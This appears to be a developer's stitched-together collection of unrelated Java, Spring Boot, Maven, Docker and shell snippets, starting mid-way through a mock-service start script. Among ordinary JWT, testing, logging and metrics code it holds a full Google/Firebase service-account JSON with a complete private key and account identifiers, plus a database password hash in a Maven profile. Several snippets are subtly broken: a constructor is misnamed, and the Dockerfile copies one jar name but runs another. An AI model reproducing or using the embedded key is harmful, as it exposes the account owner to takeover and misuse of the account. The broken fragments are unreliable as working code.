		kill -9 $! &> /dev/null # this kills the process which failed to start completely
		rm nohup.out	
    	echo $RULES_FILE_PATH "does not exist...please edit start.sh to set the correct RULES_FILE_PATH"
    	
else
    	MOCK_PID=$!
		echo "found ruleset at " $RULES_FILE_PATH
		echo "started the mocksy process with the processid" $MOCK_PID
		echo $MOCK_PID > .pid.txt
fi
echo
echo "check nohup.out for logs and errors"
echo
--------------------------------------------------------------------------------------------------------
import org.jhipster.blog.domain.User;
import org.jhipster.blog.repository.UserRepository;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Transactional;

import java.util.*;
import java.util.stream.Collectors;

/**
 * Authenticate a user from the database.
 */
@Component("userDetailsService")
public class DomainUserDetailsService implements UserDetailsService {

    private final Logger log = LoggerFactory.getLogger(DomainUserDetailsService.class);

    private final UserRepository userRepository;

    public DomainUserDetailsService(UserRepository userRepository) {
        this.userRepository = userRepository;
    }

    @Override
    @Transactional
    public UserDetails loadUserByUsername(final String login) {
        log.debug("Authenticating {}", login);
        String lowercaseLogin = login.toLowerCase(Locale.ENGLISH);
        Optional<User> userFromDatabase = userRepository.findOneWithAuthoritiesByLogin(lowercaseLogin);
        return userFromDatabase.map(user -> {
            if (!user.getActivated()) {
                throw new UserNotActivatedException("User " + lowercaseLogin + " was not activated");
            }
            List<GrantedAuthority> grantedAuthorities = user.getAuthorities().stream()
                    .map(authority -> new SimpleGrantedAuthority(authority.getName()))
                .collect(Collectors.toList());
            return new org.springframework.security.core.userdetails.User(lowercaseLogin,
                user.getPassword(),
                grantedAuthorities);
        }).orElseThrow(() -> new UsernameNotFoundException("User " + lowercaseLogin + " was not found in the " +
        "database"));
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.util.StringUtils;
import org.springframework.web.filter.GenericFilterBean;

import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

/**
 * Filters incoming requests and installs a Spring Security principal if a header corresponding to a valid user is
 * found.
 */
public class JWTFilter extends GenericFilterBean {

    private TokenProvider tokenProvider;

    public JWTFilter(TokenProvider tokenProvider) {
        this.tokenProvider = tokenProvider;
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)
        throws IOException, ServletException {
        HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
        String jwt = resolveToken(httpServletRequest);
        if (StringUtils.hasText(jwt) && this.tokenProvider.validateToken(jwt)) {
            Authentication authentication = this.tokenProvider.getAuthentication(jwt);
            SecurityContextHolder.getContext().setAuthentication(authentication);
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    private String resolveToken(HttpServletRequest request){
        String bearerToken = request.getHeader(JWTConfigurer.AUTHORIZATION_HEADER);
        if (StringUtils.hasText(bearerToken) && bearerToken.startsWith("Bearer ")) {
            return bearerToken.substring(7, bearerToken.length());
        }
        return null;
    }
}
--------------------------------------------------------------------------------------------------------
import io.github.jhipster.config.JHipsterProperties;

import java.util.*;
import java.util.stream.Collectors;
import javax.annotation.PostConstruct;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.User;
import org.springframework.stereotype.Component;

import io.jsonwebtoken.*;

@Component
public class TokenProvider {

    private final Logger log = LoggerFactory.getLogger(TokenProvider.class);

    private static final String AUTHORITIES_KEY = "auth";

    private String secretKey;

    private long tokenValidityInMilliseconds;

    private long tokenValidityInMillisecondsForRememberMe;

    private final JHipsterProperties jHipsterProperties;

    public TokenProvider(JHipsterProperties jHipsterProperties) {
        this.jHipsterProperties = jHipsterProperties;
    }

    @PostConstruct
    public void init() {
        this.secretKey =
            jHipsterProperties.getSecurity().getAuthentication().getJwt().getSecret();

        this.tokenValidityInMilliseconds =
            1000 * jHipsterProperties.getSecurity().getAuthentication().getJwt().getTokenValidityInSeconds();
        this.tokenValidityInMillisecondsForRememberMe =
            1000 * jHipsterProperties.getSecurity().getAuthentication().getJwt().getTokenValidityInSecondsForRememberMe();
    }

    public String createToken(Authentication authentication, Boolean rememberMe) {
        String authorities = authentication.getAuthorities().stream()
            .map(GrantedAuthority::getAuthority)
            .collect(Collectors.joining(","));

        long now = (new Date()).getTime();
        Date validity;
        if (rememberMe) {
            validity = new Date(now + this.tokenValidityInMillisecondsForRememberMe);
        } else {
            validity = new Date(now + this.tokenValidityInMilliseconds);
        }

        return Jwts.builder()
            .setSubject(authentication.getName())
            .claim(AUTHORITIES_KEY, authorities)
            .signWith(SignatureAlgorithm.HS512, secretKey)
            .setExpiration(validity)
            .compact();
    }

    public Authentication getAuthentication(String token) {
        Claims claims = Jwts.parser()
            .setSigningKey(secretKey)
            .parseClaimsJws(token)
            .getBody();

        Collection<? extends GrantedAuthority> authorities =
            Arrays.stream(claims.get(AUTHORITIES_KEY).toString().split(","))
                .map(SimpleGrantedAuthority::new)
                .collect(Collectors.toList());

        User principal = new User(claims.getSubject(), "", authorities);

        return new UsernamePasswordAuthenticationToken(principal, token, authorities);
    }

    public boolean validateToken(String authToken) {
        try {
            Jwts.parser().setSigningKey(secretKey).parseClaimsJws(authToken);
            return true;
        } catch (SignatureException e) {
            log.info("Invalid JWT signature.");
            log.trace("Invalid JWT signature trace: {}", e);
        } catch (MalformedJwtException e) {
            log.info("Invalid JWT token.");
            log.trace("Invalid JWT token trace: {}", e);
        } catch (ExpiredJwtException e) {
            log.info("Expired JWT token.");
            log.trace("Expired JWT token trace: {}", e);
        } catch (UnsupportedJwtException e) {
            log.info("Unsupported JWT token.");
            log.trace("Unsupported JWT token trace: {}", e);
        } catch (IllegalArgumentException e) {
            log.info("JWT token compact of handler are invalid.");
            log.trace("JWT token compact of handler are invalid trace: {}", e);
        }
        return false;
    }
}
--------------------------------------------------------------------------------------------------------
{
  "type": "service_account",
  "project_id": "one-click-research",
  "private_key_id": "85ed53ca03beaa508081a307adc228b9f593690f",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCZiO2UI2XwwRQr\nQk6CCs2luxn/QbYKd297v3DEHG/kG1OOeyehT8bU6BQGaHKQl92gAaAnZkD8v8d/\nkzj4bqT5888ttyhZxl59uXASoC+HSxafTFhIDNvD/QXPVQnhPT+1C3e+KgQM3Ww6\nqAb6eB4DzSKzGf+DnVk4I6L5oMVeEZTILUa87RSygPmQJDIdoj/2IHfGeGhjiJmh\ninAPLEcW6yQVfKFfvHq6H29Qxg+fRYmjgw/1RiVH4vWXvZNs38JOcY2d1QzpbnTT\nSkgmwLQIBUfwChBPji0K9WWp//xXYLc1uN7JAp3tY8G0R5YriegzFPbILYdo4coO\nb3Dy9UIvAgMBAAECggEAL/QBaBRKQZC8cOprxNgE9O9kJkJqzggRrM/VM5tCIzeZ\nuFWkwhA9pL+7iWjT529XTCNV1xhr0cVAVQsxbv53zo2ktr2O/8MiPhhN9bNMRPBh\n520b4Z0KgsMjLmd8B3puzGgBhUZwL2h05jkWvOIJVdybKt9C2+OoOw1+WIMrQb62\nJSKCsmWHpgeq5lSPaCe0YKJA5WYgni9No+KvEphVX2W/A7xceP2ozanQfk/SHZOo\ndQX3Y4V1b4YwMkrKqv0oe/XIAapVjZLB9dgccpSficEKrqdVnzxz/53EOVW/H7Kx\ne5CTP/DMmu+F1bmCXkglldgMw/TgHatoyOwi5/L0EQKBgQDIQciS3oiedXB7L82s\nTExLqA2Ek+A75Yo/+XFkdkWWJYjcmF3UsWbx5o1H0kdgsk2quyUuunF/IzbziZYR\n2CerdHbvjd6FNyY7GJPHl1hgWegazGb4ZpP2qZzSwr1ChOu+YIk+V30I5cID16oR\n0OIqtdSEO8zGshw5GixM90v9eQKBgQDERcAdxtoZeB4AdW5Z72m7uGkm9GxZnMxw\nJ2McULUQn2agXjLx++/IS0PV0tx6dHs6dfmYhaw6UrOKYo/zRQ2xG5xkac6X6AHR\ninYJ9nysf4TqAcf8GbpGcCHCRwzKibuOwpNIVvT4/9N1bqoY/I+NyewoNVXu/pdc\nWMRpgb9a5wKBgAY6NXiLvwfecw8Bn426Ga1InpL+3jw+mRwAL8yF+QgARs9FVbWl\nhqQDHWWcXmfdY5jplPBtD9Z6S90q7CXF6QXl60Trzn2qB2BTFVVhmXf1k8gxjwou\ndm93Os87CxOkeohDDEGKCvNZ4byo2jsPmdjmKqOqEGYlZ8dGzxXdotlRAoGAD0hb\nGDZ2nwsSUvjR2eDhe8N1NJpNoYCrDoSSnA7QunWe+Re8ocj7N75cjta3YjWVrsym\n3bBy46uy3TClgsy6rzK2L79pXbyr/5PncwklVg0r3Ui8OK4MKhXrGwSLQ24ME6ak\n7zoOIyFQZtFyHzXzO5ggclUM1uouAPvMd2ap7rsCgYBzKFeWi4VFHQ0Y+lSTm6jK\nAtq2P/ze+dZbF4aEQOHWQvffOnpCwIqW0Nr//ONOR6IxHpquoadavNw2KAqC3E+5\n23QyWBHOrLziDwLK8pmXV0NF3L+GHkC7jrQ+3DQQCTB6wPQF6jZjZqgnNq8Bx04X\no2pNLDyyPLU7OOhWrzS/ow==\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-f94ft@one-click-research.iam.gserviceaccount.com",
  "client_id": "111069798407979759883",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-f94ft%40one-click-research.iam.gserviceaccount.com"
}
--------------------------------------------------------------------------------------------------------
# The shell script to stop the mock service

echo "Stopping the mockprocess with processid $(cat .pid.txt)"

kill -9 $(cat .pid.txt) &> /dev/null; 

rm .pid.txt &> /dev/null; 
rm nohup.out &> /dev/null; 
echo "Done !!"# The shell script to stop the mock service

echo "Stopping the mockprocess with processid $(cat .pid.txt)"

kill -9 $(cat .pid.txt) &> /dev/null; 

rm .pid.txt &> /dev/null; 
rm nohup.out &> /dev/null; 
echo "Done !!"
--------------------------------------------------------------------------------------------------------
$ mvn package -P xtest, another-profile-id

# multi modules, same syntax
$ mvn -pl module-name package -P xtest, another-profile-id
--------------------------------------------------------------------------------------------------------
# Run tests which tagged with `integration, slow, feature-168`
$ mvn -Dgroups="integration, fast, feature-168"

# Exclude tests which tagged with 'slow'
$ mvn -DexcludedGroups="slow"
--------------------------------------------------------------------------------------------------------
java -jar lombok.jar config -g --verbose
--------------------------------------------------------------------------------------------------------
mvn help:active-profiles
--------------------------------------------------------------------------------------------------------
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN">
    <Appenders>
        <Console name="ConsoleAppender" target="SYSTEM_OUT">
            <PatternLayout
                    pattern="%d [%t] %-5level %logger{36} - %msg%n%throwable"/>
        </Console>
        <ReportPortalLog4j2Appender name="ReportPortalAppender">
            <PatternLayout
                    pattern="%d [%t] %-5level %logger{36} - %msg%n%throwable"/>
        </ReportPortalLog4j2Appender>
    </Appenders>
    <Loggers>
        <Root level="DEBUG">
            <AppenderRef ref="ConsoleAppender"/>
            <AppenderRef ref="ReportPortalAppender"/>
        </Root>
    </Loggers>
</Configuration>

<configuration>
                <testFailureIgnore>false</testFailureIgnore>
                <argLine>
                    -javaagent:"${settings.localRepository}/org/aspectj/aspectjweaver/${aspectj.version}/aspectjweaver-${aspectj.version}.jar"
                </argLine>
                <systemProperties>
                    <property>
                        <name>junit.jupiter.extensions.autodetection.enabled</name>
                        <value>true</value>
                    </property>
                </systemProperties>
            </configuration>
			
			  <build>
    <plugins>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-surefire-plugin</artifactId>
        <version>3.0.0-M3</version>
        <configuration>
          <includes>
            <include>%regex[.*(Cat|Dog).*Test.*]</include>
          </includes>
        </configuration>
      </plugin>
    </plugins>
  </build>
--------------------------------------------------------------------------------------------------------
        <dependency>
            <groupId>org.hsqldb</groupId>
            <artifactId>hsqldb</artifactId>
            <version>2.3.3</version>
            <scope>runtime</scope>
        </dependency>
		
		
		import com.github.database.rider.springboot.model.company.CompanyRepository;
import com.zaxxer.hikari.HikariDataSource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.boot.autoconfigure.jdbc.DataSourceProperties;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.boot.orm.jpa.EntityManagerFactoryBuilder;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;
import org.springframework.core.env.Environment;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.orm.jpa.JpaTransactionManager;
import org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean;
import org.springframework.transaction.PlatformTransactionManager;
import org.springframework.transaction.annotation.EnableTransactionManagement;

import javax.persistence.EntityManagerFactory;
import javax.sql.DataSource;
import java.util.HashMap;
import java.util.Map;


@Configuration
@EnableTransactionManagement
@EnableJpaRepositories(
        entityManagerFactoryRef = "companyEntityManagerFactory", basePackages = {
        "com.github.database.rider.springboot.model.company", "com.github.database.rider.springboot.infra.company"},
        transactionManagerRef = "companyTransactionManager")
public class CompanyDBConfig {

    @Autowired
    private Environment env;

    @Bean(name = "companyDataSourceProperties")
    @ConfigurationProperties("company.datasource")
    public DataSourceProperties dataSourceProperties() {
        return new DataSourceProperties();
    }

    @Bean(name = "companyDataSource")
    @ConfigurationProperties("company.datasource.configuration")
    public DataSource dataSource(@Qualifier("companyDataSourceProperties") DataSourceProperties companyDataSourceProperties) {
        return companyDataSourceProperties.initializeDataSourceBuilder().type(HikariDataSource.class)
                .build();
    }

    @Bean(name = "companyEntityManagerFactory")
    public LocalContainerEntityManagerFactoryBean entityManagerFactory(
            EntityManagerFactoryBuilder builder, @Qualifier("companyDataSource") DataSource companyDataSource) {
        Map<String, Object> properties = new HashMap<>();
        properties.put("hibernate.hbm2ddl.auto",
                env.getProperty("spring.jpa.hibernate.ddl-auto"));
        properties.put("hibernate.dialect",
                env.getProperty("spring.jpa.properties.hibernate.dialect"));
        return builder
                .dataSource(companyDataSource)
                .properties(properties)
                .packages(CompanyRepository.class.getPackage().getName())
                .persistenceUnit("companyPU")
                .build();
    }

    @Bean(name = "companyTransactionManager")
    public PlatformTransactionManager transactionManager(
            @Qualifier("companyEntityManagerFactory") EntityManagerFactory companyEntityManagerFactory) {
        return new JpaTransactionManager(companyEntityManagerFactory);
    }

}
--------------------------------------------------------------------------------------------------------
@Test
void givenValidUser_whenSaveUser_thenSucceed(@Mock MailClient mailClient) {
    // Given
    user = new User("Jerry", 12);
    when(userRepository.insert(any(User.class))).then(new Answer<User>() {
        int sequence = 1;
             
        @Override
        public User answer(InvocationOnMock invocation) throws Throwable {
            User user = (User) invocation.getArgument(0);
            user.setId(sequence++);
            return user;
        }
    });
 
    userService = new DefaultUserService(userRepository, settingRepository, mailClient);
 
    // When
    User insertedUser = userService.register(user);
         
    // Then
    verify(userRepository).insert(user);
    Assertions.assertNotNull(user.getId());
    verify(mailClient).sendUserRegistrationMail(insertedUser);
}
--------------------------------------------------------------------------------------------------------
LauncherDiscoveryRequest request = LauncherDiscoveryRequestBuilder.request()
    .selectors(
        selectPackage("com.example.mytests"),
        selectClass(MyTestClass.class)
    )
    .filters(
        includeClassNamePatterns(".*Tests")
    )
    .build();

Launcher launcher = LauncherFactory.create();

// Register a listener of your choice
SummaryGeneratingListener listener = new SummaryGeneratingListener();
launcher.registerTestExecutionListeners(listener);

launcher.execute(request);

TestExecutionSummary summary = listener.getSummary();
// Do something with the TestExecutionSummary.
--------------------------------------------------------------------------------------------------------
    <profile>
            <id>dev</id>
            <activation>
                <!-- this profile is active by default -->
                <activeByDefault>true</activeByDefault>
                <!-- activate if system properties 'env=dev' -->
                <property>
                    <name>env</name>
                    <value>dev</value>
                </property>
            </activation>
            <properties>
                <db.driverClassName>com.mysql.jdbc.Driver</db.driverClassName>
                <db.url>jdbc:mysql://localhost:3306/dev</db.url>
                <db.username>mkyong</db.username>
                <db.password>8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92</db.password>
            </properties>
        </profile>
--------------------------------------------------------------------------------------------------------
import java.io.IOException;
import java.util.Map;
import java.util.Optional;
import java.util.concurrent.ConcurrentMap;
import java.util.concurrent.ConcurrentSkipListMap;
import java.util.function.Function;

/**
* Resource handler implementation
*
* @param <T> type of configurable resource
*/
public class ResourceExceptionHandler<T extends AutoCloseable> {

    /**
     * Functional resource interface declaration
     *
     * @param <R> type of configurable resource
     * @param <I> type of configurable input resource identifier
     * @param <O> type of configurable output resource identifier
     */
    public interface FunctionWithResource<R extends AutoCloseable, I, O> {
        O apply(final R resource, final I value) throws IOException;
    }

    /**
     * Resource creator interface declaration
     *
     * @param <R> type of configurable resource
     */
    public interface ResourceCreator<R extends AutoCloseable> {
        R create() throws IOException;
    }

    private final ResourceCreator<T> init;
    private final ConcurrentMap<Object, Exception> exceptions = new ConcurrentSkipListMap<>();

    public ResourceExceptionHandler(final ResourceCreator<T> init) {
        ValidationUtils.checkNotNull(init, "Resource initializer (initialization code for resource) should not be null");
        this.init = init;
    }

    public Map<Object, Exception> getExceptions() {
        return this.exceptions;
    }

    public Function<Integer, Optional<Integer>> map(final FunctionWithResource<T, Integer, Integer> function) {
        return i -> {
            try (final T resource = this.init.create()) {
                return Optional.of(function.apply(resource, i));
            } catch (Exception e) {
                this.exceptions.put(i, e);
                return Optional.empty();
            }
        };
    }
}
--------------------------------------------------------------------------------------------------------
/**
* This implementation throws IllegalStateException if attempting to
* read the underlying stream multiple times.
*/
@Override
public InputStream getInputStream() throws IOException, IllegalStateException {
   if (this.read) {
      throw new IllegalStateException("InputStream has already been read - " +
            "do not use InputStreamResource if a stream needs to be read multiple times");
   }
   this.read = true;
   return this.inputStream;
}
--------------------------------------------------------------------------------------------------------
.kite--grid {
  $unit: 12;
  $gutter: 10px;
  > .kite__item {
    @for $i from 1 through $unit { 
      &.is-#{$i}of#{$unit} {
        width: percentage($i / $unit);
      }
    }
  }
  &.has-gutter {
    display: block;
    width: auto;
    margin-left: -$gutter;
    margin-right: -$gutter;
    > .kite__item {
      padding-left: $gutter;
      padding-right: $gutter;
    }
  }
}

https://github.com/1000ch/antennas
--------------------------------------------------------------------------------------------------------
FROM java:8-jdk-alpine
VOLUME /tmp
ARG DEPENDENCY=./target/modules
COPY ${DEPENDENCY}/diffy-1.1.0.jar /usr/app/boor.jar
WORKDIR /usr/app
RUN sh -c 'touch demo-docker-0.0.1-SNAPSHOT.jar'
ENTRYPOINT [
"java",
"-Djava.security.egd=file:/dev/./urandom",
"-XX:MaxPermSize=256m",
"-XX:NativeMemoryTracking=summary",
"-XX:+UseConcMarkSweepGC",
"-Xmx2g",
"-Xms32m",
"-jar",
"boot.jar"
]
--------------------------------------------------------------------------------------------------------
Example 24. Example performance option configuration
hibernate.search.Animals.2.indexwriter.max_merge_docs = 10
hibernate.search.Animals.2.indexwriter.merge_factor = 20
hibernate.search.Animals.2.indexwriter.max_buffered_docs = default
hibernate.search.default.indexwriter.max_merge_docs = 100
hibernate.search.default.indexwriter.ram_buffer_size = 64
The configuration in Example performance option configuration will result in these settings applied on the second shard of the Animal index:

max_merge_docs = 10

merge_factor = 20

ram_buffer_size = 64MB

max_buffered_docs = Lucene default
--------------------------------------------------------------------------------------------------------
public class BigDecimalNumericFieldBridge implements TwoWayFieldBridge {

    private static final BigDecimal storeFactor = BigDecimal.valueOf( 100 );

    @Override
    public void set(String name, Object value, Document document, LuceneOptions luceneOptions) {
        if ( value != null ) {
            BigDecimal decimalValue = (BigDecimal) value;
            Long indexedValue = decimalValue.multiply( storeFactor ).longValue();
            luceneOptions.addNumericFieldToDocument( name, indexedValue, document );
        }
    }

    @Override
    public Object get(String name, Document document) {
        String fromLucene = document.get( name );
        BigDecimal storedBigDecimal = new BigDecimal( fromLucene );
        return storedBigDecimal.divide( storeFactor );
    }

    @Override
    public String objectToString(Object object) {
        return object.toString();
    }
}

https://docs.jboss.org/hibernate/stable/search/reference/en-US/html_single/#_configuration
--------------------------------------------------------------------------------------------------------
import javax.validation.ConstraintViolation;
import javax.validation.ConstraintViolationException;
import javax.validation.Validation;
import javax.validation.Validator;
import javax.validation.ValidatorFactory;

import java.util.Set;

import io.reflectoring.validation.Input;
import org.springframework.stereotype.Service;

@Service
public class ProgrammaticallyValidatingService {

  private Validator validator;

  public ProgrammaticallyValidatingService(Validator validator) {
    this.validator = validator;
  }

  public void validateInput(Input input) {
    ValidatorFactory factory = Validation.buildDefaultValidatorFactory();
    Validator validator = factory.getValidator();
    Set<ConstraintViolation<Input>> violations = validator.validate(input);
    if (!violations.isEmpty()) {
      throw new ConstraintViolationException(violations);
    }
  }

  public void validateInputWithInjectedValidator(Input input) {
    Set<ConstraintViolation<Input>> violations = validator.validate(input);
    if (!violations.isEmpty()) {
      throw new ConstraintViolationException(violations);
    }
  }
}
--------------------------------------------------------------------------------------------------------
import com.memorynotfound.kafka.producer.Sender;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class SpringKafkaApplication implements CommandLineRunner {

    public static void main(String[] args) {
        SpringApplication.run(SpringKafkaApplication.class, args);
    }

    @Autowired
    private Sender sender;

    @Override
    public void run(String... strings) throws Exception {
        for (int i = 1; i < 13; i++){
            sender.send("message-" + i);
        }
    }
}
--------------------------------------------------------------------------------------------------------
about:preferences#search
--------------------------------------------------------------------------------------------------------
        this.externalFileIds = Stream.concat(this.externalFileIds.stream(), externalFileIds.stream())
                .collect(Collectors.toList());
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@SpringBootTest(classes = TestApplication.class, webEnvironment = WebEnvironment.DEFINED_PORT)
public class ExcludeAutoConfigIntegrationTest {
    // ...
}
@SpringBootApplication(exclude=SecurityAutoConfiguration.class)
public class TestApplication {
 
    public static void main(String[] args) {
        SpringApplication.run(TestApplication.class, args);
    }
}
--------------------------------------------------------------------------------------------------------
<configuration>
	<include resource="logback-appender.xml" />
	<include resource="env/${sys.env}/logback-logger.xml" optional="true" />

	<appender name="ASYNC" class="ch.qos.logback.classic.AsyncAppender">
		<appender-ref ref="MAIN" />
	</appender>

	<root level="INFO">
		<appender-ref ref="ASYNC" />
	</root>
</configuration>
--------------------------------------------------------------------------------------------------------
service-config.json
{
	"basePackage": "org.afc.petstore",
	"apiPackage": "org.afc.petstore.api",
	"configPackage": "org.afc.petstore.config",
	"modelPackage": "org.afc.petstore.model",
	"delegatePattern": "true",
	"hideGenerationTimestamp": "true"
}
--------------------------------------------------------------------------------------------------------
	@Bean
    public Docket swaggerSpringMvcPlugin() {
        return new Docket(DocumentationType.SWAGGER_2)
        		.select()
        		.apis(RequestHandlerSelectors.withMethodAnnotation(ApiOperation.class))
        		.build()
        		.securitySchemes(Collections.singletonList(new ApiKey("Bearer", "Authorization", "header")));
    }
--------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Value;
import org.springframework.core.io.Resource;
import org.springframework.stereotype.Component;
import org.tuckey.web.filters.urlrewrite.Conf;
import org.tuckey.web.filters.urlrewrite.UrlRewriteFilter;

import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import java.io.IOException;


@Component
public class MyUrlRewriteFilter extends UrlRewriteFilter {

    private static final String CONFIG_LOCATION = "classpath:/urlrewrite.xml";

    //Inject the Resource from the given location
    @Value(CONFIG_LOCATION)
    private Resource resource;

    //Override the loadUrlRewriter method, and write your own implementation
    @Override
    protected void loadUrlRewriter(FilterConfig filterConfig) throws ServletException {
        try {
            //Create a UrlRewrite Conf object with the injected resource
            Conf conf = new Conf(filterConfig.getServletContext(), resource.getInputStream(), resource.getFilename(), "@@yourOwnSystemId@@");
            checkConf(conf);
        } catch (IOException ex) {
            throw new ServletException("Unable to load URL rewrite configuration file from " + CONFIG_LOCATION, ex);
        }
    }
}

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlrewrite PUBLIC "-//tuckey.org//DTD UrlRewrite 4.0//EN"
        "http://www.tuckey.org/res/dtds/urlrewrite4.0.dtd">
<urlrewrite>
    <rule>
        <from>/users/swagger-ui.html</from>
        <to type="passthrough">/swagger-ui.html</to>
    </rule>

    <rule>
        <from>/users/webjars/(.*)</from>
        <to type="passthrough">/webjars/$1</to>
    </rule>

    <rule>
        <from>/users/api-docs</from>
        <to type="passthrough">/api-docs</to>
    </rule>

    <rule>
    <from>/users/configuration/(.*)</from>
    <to type="passthrough">/configuration/$1</to>
    </rule>

    <rule>
    <from>/users/swagger-resources</from>
    <to type="passthrough">/swagger-resources</to>
</rule>
</urlrewrite>
--------------------------------------------------------------------------------------------------------
@SpringBootTest(classes = {BackupTestDefinition.class})
@ActiveProfiles({"test", "dev"})
@RunWith(SpringRunner.class)
public class BackupServiceTest {
    @Value(value = "${ne.endpoint}")
    private String ne;
    @Autowired
    private RestTemplate restTemplate;    
    private MockRestServiceServer mockServer;

    @Before
    public void setup() {
        mockServer = MockRestServiceServer.bindTo(restTemplate).build(new UnorderedRequestExpectationManager());
        mockServer.expect(ExpectedCount.manyTimes(), requestTo(UriComponentsBuilder.fromHttpUrl(ne).build().toUri())).andExpect(method(HttpMethod.POST)).andRespond(withSuccess());
    }

    @Test
    public void testNotificationProcessing() throws IOException, InterruptedException, InitializationException, ExecutionException {
        //some testing code
    }
}

@RunWith(SpringRunner.class)
@SpringBootTest(classes = CityController.class, webEnvironment = SpringBootTest.WebEnvironment.MOCK)
@AutoConfigureMockMvc
public class CityControllerTest {
    @Autowired
    MockMvc mockMvc;

    @Test
    public void testGetAllCities() throws Exception {
        mockMvc.perform(get("/cities")
                .contentType(MediaType.APPLICATION_JSON))
                .andExpect(status().isOk());
    }
}
@Bean(name = "springCacheManager")
  @ConditionalOnMissingBean
  public RedisCacheManager cacheManager(RedisConnectionFactory redisConnectionFactory) {
    RedisCacheManagerBuilder builder = RedisCacheManager
        .builder(redisConnectionFactory).cacheDefaults(getConfiguration());
    List<String> cacheNames = this.cacheProperties.getCacheNames();
    if (!cacheNames.isEmpty()) {
      builder.initialCacheNames(new LinkedHashSet<>(cacheNames));
    }
    return this.customizerInvoker.customize(builder.build());
--------------------------------------------------------------------------------------------------------
secondArray = Arrays.stream(array)
              .flatMapToInt(i -> Arrays.stream(i)) //преобразовываем Stream<int[]> в Stream
              .toArray(); // преобразовываем Stream в int[] 
--------------------------------------------------------------------------------------------------------
	<plugin>
					<groupId>org.apache.maven.plugins</groupId>
					<artifactId>maven-failsafe-plugin</artifactId>
					<version>2.5</version>
					<configuration>
						<argLine>-Xms512m -Xmx1024m -XX:PermSize=128m</argLine>
					</configuration>
				</plugin>
--------------------------------------------------------------------------------------------------------
/set options +HISTORY_DISCLOSED
--------------------------------------------------------------------------------------------------------
class Dictionary {
	private List<String> words = new CopyOnWriteArrayList<>();

	public MyComponent(MeterRegistry registry) {
		registry.gaugeCollectionSize("dictionary.size", Tags.empty(), words);
	}

	...
}
--------------------------------------------------------------------------------------------------------
docker run -d --rm --name jmx -p 5000:5000 sysdiglabs/jmx-metrics:0.1
--------------------------------------------------------------------------------------------------------
package com.paragon.mailingcontour.commons.actuator.metrics;

import com.paragon.mailingcontour.commons.utils.MessageBuffer;
import io.micrometer.core.instrument.Counter;
import io.micrometer.core.instrument.Gauge;
import io.micrometer.core.instrument.MeterRegistry;
import io.micrometer.core.instrument.Tag;
import io.micrometer.core.instrument.binder.MeterBinder;
import io.micrometer.core.lang.NonNullApi;
import io.micrometer.core.lang.NonNullFields;

import java.util.Collections;
import java.util.Optional;

@NonNullApi
@NonNullFields
public class ErrorsMetrics implements MeterBinder, AutoCloseable {
    /**
     * Errors metrics counter name
     */
    public static final String ERRORS_METRICS_COUNTER = "errors.counter.total";
    /**
     * Errors metrics gauge name
     */
    public static final String ERRORS_METRICS_GAUGE = "errors.buffer";

    private final MessageBuffer messageBuffer;
    private final Iterable<Tag> tags;

    public ErrorsMetrics(final MessageBuffer messageBuffer) {
        this(messageBuffer, null);
    }

    public ErrorsMetrics(final MessageBuffer<Object> messageBuffer, final Iterable<Tag> tags) {
        this.messageBuffer = messageBuffer;
        this.tags = Optional.ofNullable(tags).orElseGet(Collections::emptyList);
    }

    @Override
    public void bindTo(final MeterRegistry registry) {
        Counter.builder(ERRORS_METRICS_COUNTER)
                .description("Total number of registered error events")
                .tags(this.tags)
                .tags("counter", "error")
                .baseUnit("errors")
                .register(registry);

        Gauge.builder(ERRORS_METRICS_GAUGE, this.messageBuffer, MessageBuffer::size)
                .description("Registered errors stored in a buffer")
                .tags(this.tags)
                .tags("buffer", "error")
                .baseUnit("errors")
                .register(registry);
    }

    @Override
    public void close() {
        this.messageBuffer.clear();
    }
}
--------------------------------------------------------------------------------------------------------
String rawJson = Resources.asString("json-test/nested.json");
JsonNode node = Json.serializer()
                    .nodeFromJson(rawJson)
                    .path("nested1")
                    .path("nested2")
                    .path("nested3");
